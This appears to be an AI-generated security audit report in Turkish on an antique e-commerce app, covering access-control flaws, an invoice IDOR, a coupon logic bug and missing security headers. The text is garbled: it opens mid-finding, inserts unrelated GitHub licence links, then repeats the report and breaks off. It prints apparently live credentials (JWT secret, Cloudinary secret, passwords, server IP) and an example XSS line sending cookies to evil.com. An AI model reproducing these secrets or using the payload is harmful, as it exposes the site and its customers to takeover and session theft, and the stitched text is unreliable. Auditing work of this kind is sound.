### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
